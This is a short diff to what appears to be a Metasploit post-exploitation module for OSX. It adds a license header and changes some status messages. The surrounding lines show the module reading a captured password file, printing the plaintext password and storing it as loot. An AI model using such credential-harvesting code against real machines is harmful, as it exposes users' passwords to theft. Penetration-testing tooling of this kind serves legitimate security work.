@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/common'
@@ -109,9 +116,9 @@ class Metasploit3 < Msf::Post
 
 		if pass_found
 			password_data = read_file("#{pass_file}").strip
-			print_status("password file contents: #{password_data}")
+			print_good("password file contents: #{password_data}")
 			passf = store_loot("password", "text/plain", session, password_data, "passwd.pwd", "OSX Password")
-			print_status("Password data stored as loot in: #{passf}")
+			print_good("Password data stored as loot in: #{passf}")
 		else
 			print_status("Timeout period expired before credentials were entered!")
 		end
